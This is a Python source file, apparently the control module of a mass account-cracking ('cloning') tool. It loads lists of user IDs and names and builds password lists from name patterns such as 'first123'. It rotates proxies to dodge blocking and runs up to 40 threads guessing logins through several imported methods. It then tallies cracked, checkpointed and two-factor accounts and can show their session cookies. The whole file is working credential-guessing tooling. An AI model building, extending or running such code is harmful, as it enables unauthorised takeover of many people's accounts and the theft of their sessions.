import os, sys, time
from config import *
from password_manager import get_auto_passlist
from proxy_manager import ProxyManager
from m1_graph import __M1X__
from m2_bgraph import __M2X__
from m3_api import __M3X__

class __PS__:
    def __init__(self) -> None:
        self.loop = 0
        self.oks = []
        self.cps = []
        self.sea = []
        self.nvs = []
        self.twf = []
        self.gen = []
        self.plist = []
        self.__COOKIE__ = []
        self.__CP__ = []
        self.__LOCK__ = []
        self.proxy_manager = None

    def __MENU__(self) -> None:
        __CLEAR__()
        print(f"{xp1} FILE CLONING ")
        print(f"{xp2} RANDOM CLONING{R} ({W}SOON{R}) ")
        print(f"{xp0} EXIT TOOLS ")
        __LINE__()
        __MENUC__ = input(f"{xpx} INPUT MENU {xpxx} ")
        if __MENUC__ == "1":
            self.__FILEX__()
        elif __MENUC__ == "2":
            __LINE__()
            print(f"{xp} RANDOM CLONE COMING SOON...! ")
            time.sleep(1.1)
            self.__MENU__()
        elif __MENUC__ == "0":
            __LINE__()
            print(f"{xp} EXIT SUCCESSFULLY ")
            time.sleep(1.1)
            __LINE__()
            sys.exit()
        else:
            __LINE__()
            print(f"{xp} INVALID OPTION TRY AGAIN ")
            time.sleep(1)
            self.__MENU__()
    
    def __PROXY_MENU__(self):
        __CLEAR__()
        print(f"{xp1} USE PROXY")
        print(f"{xp2} NO PROXY")
        __LINE__()
        proxy_choice = input(f"{xpx} USE PROXY? {xpxx} ")
        
        if proxy_choice == "1":
            self.proxy_manager = ProxyManager()
            __CLEAR__()
            print(f"{xp1} LOAD PROXY FROM FILE")
            print(f"{xp2} LOAD PROXY FROM URL")
            print(f"{xp3} LOAD DEFAULT PROXIES")
            print(f"{xp4} ENTER PROXY MANUALLY")
            __LINE__()
            load_choice = input(f"{xpx} LOAD METHOD {xpxx} ")
            
            if load_choice == "1":
                __CLEAR__()
                print(f"{xp} EXAMPLE: /sdcard/proxy.txt")
                __LINE__()
                proxy_file = input(f"{xpx} PROXY FILE PATH {xpxx} ")
                count = self.proxy_manager.load_proxies_from_file(proxy_file)
                print(f"{xp} LOADED {count} PROXIES")
            elif load_choice == "2":
                __CLEAR__()
                print(f"{xp} EXAMPLE: https://example.com/proxies.txt")
                __LINE__()
                proxy_url = input(f"{xpx} PROXY URL {xpxx} ")
                count = self.proxy_manager.load_proxies_from_url(proxy_url)
                print(f"{xp} LOADED {count} PROXIES")
            elif load_choice == "3":
                print(f"{xp} LOADING DEFAULT PROXIES...")
                count = self.proxy_manager.load_default_proxies()
                print(f"{xp} LOADED {count} PROXIES")
            elif load_choice == "4":
                __CLEAR__()
                print(f"{xp} EXAMPLE: 127.0.0.1:8080")
                print(f"{xp} EXAMPLE: socks5://127.0.0.1:1080")
                __LINE__()
                proxy_input = input(f"{xpx} ENTER PROXY {xpxx} ")
                self.proxy_manager.proxies.append(proxy_input)
                print(f"{xp} ADDED 1 PROXY")
            
            if self.proxy_manager.proxies:
                __CLEAR__()
                print(f"{xp} CHECK PROXIES?")
                __LINE__()
                check_choice = input(f"{xpx} Y/N {xpxx} ")
                if check_choice.lower() in ['y', 'yes', '1']:
                    self.proxy_manager.check_all_proxies()
                    if not self.proxy_manager.working_proxies:
                        print(f"{xp} NO WORKING PROXIES FOUND")
                        print(f"{xp} CONTINUING WITHOUT PROXY")
                        self.proxy_manager = None
                else:
                    self.proxy_manager.working_proxies = self.proxy_manager.proxies
            else:
                print(f"{xp} NO PROXIES LOADED")
                print(f"{xp} CONTINUING WITHOUT PROXY")
                self.proxy_manager = None
        else:
            self.proxy_manager = None
    
    def __FILEX__(self) -> None:
        self.__PROXY_MENU__()
        
        __CLEAR__()
        print(f"{xp} EXAMPLE  {xpxx} {R}/{W}sdcard{R}/{W}ids.txt{R}/{W}OR{R}/{W}File.txt ")
        __LINE__()
        __fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
        try:
            if not __fileloX__.startswith("/") and not __fileloX__.startswith("./"):
                __fileXX__ = f"/sdcard/{__fileloX__}"
            else:
                __fileXX__ = __fileloX__
            __fileckX__ = open(__fileXX__, 'r').read().splitlines()
        except FileNotFoundError:
            __LINE__()
            print(f"{xp} FILE NOT FOUND TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return
        except PermissionError:
            __LINE__()
            print(f"{xp} ALLOW STORAGE PERMISSION ")
            time.sleep(1.2)
            __LINE__()
            sys.exit()
        except IOError:
            __LINE__()
            print(f"{xp} FILE READING ERROR TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return

        __CLEAR__()
        print(f"{xp1} METHOD {R}<[{W}GRAPH{R}]>{W}")
        print(f"{xp2} METHOD {R}<[{W}B-GRAPH{R}]>{W}")
        print(f"{xp3} METHOD {R}<[{W}API{R}]>{W}")
        print(f"{xp4} METHOD {R}<[{W}B-API{R}]>{W}")
        __LINE__()
        __METHODF__ = input(f"{xpx} INPUT METHOD {xpxx} ")

        __CLEAR__()
        print(f"{xp1} AUTO PASSLIST ")
        print(f"{xp2} CUSTOM PASSLIST ")
        __LINE__()
        __PASLISTF__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")

        if __PASLISTF__ == "1":
            __CLEAR__()
            print(f"{xp1} AUTO WEAK  PASSLIST ")
            print(f"{xp2} AUTO GOOD  PASSLIST ")
            print(f"{xp3} AUTO VERY GOOD  PASSLIST ")
            print(f"{xp4} AUTO STRONG  PASSLIST ")
            print(f"{xp5} AUTO VERY STRONG   PASSLIST ")
            __LINE__()
            __COUNTRYPAS__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")
            self.plist = get_auto_passlist(__COUNTRYPAS__)
        else:
            try:
                __CLEAR__()
                print(f"{xp} ALGERIAN PASSLIST 10{R}/{W}15 LIMIT")
                print(f"{xp} OTHERS COUNTRY PASSLIST 5{R}/{W}10 LIMIT")
                __LINE__()
                __PASSFM__ = int(input(f"{xpx} PASSLIST LIMIT {xpxx} "))
            except:
                __PASSFM__ = 5

            __CLEAR__()
            print(f"{xp} EXAMPLE  {xpxx} firstlast {R}/{W} first12 {R}/{W} first123 ")
            __LINE__()
            for i in range(__PASSFM__):
                self.plist.append(input(f"{xp} ENTER PASSLIST {R}<[{W}{i+1}{R}]> {xpxx} "))

        __CLEAR__()
        print(f"{xp1} AUTO SPEED {R}<[{W}20{R}]> ")
        print(f"{xp2} CUSTOM SPEED ")
        __LINE__()
        __SPEED__ = input(f"{xpx} INPUT SPEED {xpxx} ")

        if __SPEED__ == "1":
            __MAXX__ = 20
        else:
            try:
                __CLEAR__()
                print(f"{xp} MAXIMUM SPEED LIMIT 20-40 ")
                __LINE__()
                __MAXX__ = int(input(f"{xpx} INPUT SPEED {xpxx} "))
            except ValueError:
                __MAXX__ = 40

        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW COOKIE...? ")
        __LINE__()
        __co__ = input(f"{xpx} {R}Y{R}/{W}N {xpxx} ")
        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW CP{R}/{W}2F IDS...? ")
        __LINE__()
        __cps__ = input(f"{xpx} {R}Y{R}/{W}N {xpxx} ")

        self.__COOKIE__.append('y' if __co__.lower() in ['y', 'yes', '1'] else 'n')
        self.__CP__.append('y' if __cps__.lower() in ['y', 'yes', '1'] else 'n')
        
        with ThreadPool(max_workers=__MAXX__) as __PS__:
            __CLEAR__()
            total_ids = str(len(__fileckX__))
            print(f"{xp} TOTAL{R}/{W}IDS {xpxx} {total_ids} ")
            print(f"{xp} IF NO RESULT ON{R}/{W}OFF AIRPLANE MODE")
            if self.proxy_manager:
                stats = self.proxy_manager.get_proxy_stats()
                print(f"{xp} PROXY: {stats['working']}/{stats['total']} WORKING")
            __LINE__()
            for user in __fileckX__:
                try:
                    ids, names = user.split('|')
                except ValueError:
                    continue
                passlist = self.plist
                if __METHODF__ == "1":
                    __PS__.submit(__M1X__, self, ids, names, passlist)
                elif __METHODF__ == "2":
                    __PS__.submit(__M2X__, self, ids, names, passlist)
                elif __METHODF__ == "3":
                    __PS__.submit(__M3X__, self, ids, names, passlist)
                elif __METHODF__ == "4":
                    __PS__.submit(__M3X__, self, ids, names, passlist)
                else:
                    __PS__.submit(__M1X__, self, ids, names, passlist)

        print("\033[1;37m")
        __LINE__()
        print(f"{xp} THE PROCESS HAS COMPLETED...!")
        print(f"{xp} TOTAL OK{R}/{W}2F{R}/{W}CP {xpxx} {G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}")
        __LINE__()
        print(f"{xp} THANKS FOR USING.....! ")
        sys.exit()